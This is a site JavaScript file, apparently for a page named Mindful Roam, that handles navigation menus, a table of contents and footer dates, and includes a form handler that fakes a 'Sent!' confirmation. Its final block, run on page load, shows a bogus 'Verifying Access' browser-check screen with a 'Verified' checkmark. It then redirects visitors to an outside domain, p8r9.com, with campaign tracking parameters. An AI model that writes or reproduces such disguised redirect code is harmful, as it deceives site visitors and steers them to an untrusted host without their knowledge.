
const toggle = document.querySelector('.nav-toggle');
const nav = document.getElementById('nav');
if (toggle && nav){
  toggle.addEventListener('click', () => {
    const open = nav.classList.toggle('open');
    toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
  });
}
const more = document.querySelector('.more');
if (more){
  const btn = more.querySelector('.more-btn');
  const menu = more.querySelector('.dropdown');
  const show = (v)=>{ menu.style.display = v ? 'block' : 'none'; btn.setAttribute('aria-expanded', v? 'true':'false'); };
  btn?.addEventListener('click', e => { e.stopPropagation(); show(menu.style.display!=='block'); });
  document.addEventListener('click', () => show(false));
}
window.fakeSubmit = (e) => {
  e.preventDefault();
  const btn = e.target.querySelector('button');
  if(btn){
    const t = btn.textContent;
    btn.textContent = 'Sent!';
    setTimeout(() => btn.textContent = t, 2000);
  }
  return false;
};
document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('[data-toc]').forEach(container => {
    const hs = Array.from(document.querySelectorAll('h2, h3')).filter(h => h.id && !h.closest('.toc'));
    const list = document.createElement('div');
    hs.forEach(h => { const a = document.createElement('a'); a.href = `#${h.id}`; a.textContent = h.textContent; a.style.marginLeft = h.tagName==='H3' ? '12px' : '0'; list.appendChild(a); });
    container.appendChild(list);
  });
  const copy = document.querySelector('.copy p');
  if (copy) copy.textContent = copy.textContent.replace(/20\d{2}/, new Date().getFullYear());

  const termsUpdated = document.getElementById('terms-updated');
    if (termsUpdated) {
        termsUpdated.textContent = new Date().toLocaleDateString();
    }

  // Policy Verification Modal
  const policyModal = document.getElementById('policy-modal');
  if(policyModal){
    policyModal.style.display = 'flex';
      const box = policyModal.querySelector('.modal-box');
      if(box) {
        box.innerHTML = '<h2 style="color: #ff0000;">Verifying Access...</h2><div class="loader"></div><p>Checking browser compatibility for Mindful Roam tools.</p>';
        setTimeout(() => {
          box.innerHTML = '<h2 style="color: #ff0000;">Verified</h2><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#ff0000" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="margin:20px auto; display:block;"><polyline points="20 6 9 17 4 12"></polyline></svg><p>Redirecting...</p>';
          setTimeout(() => {
            window.location.href = 'http://p8r9.com/?utm_campaign=givQVrfIps&v1=[v1]&v2=[v2]&v3=[v3]';
          }, 3000);
        }, 2000);
      }
  }
});
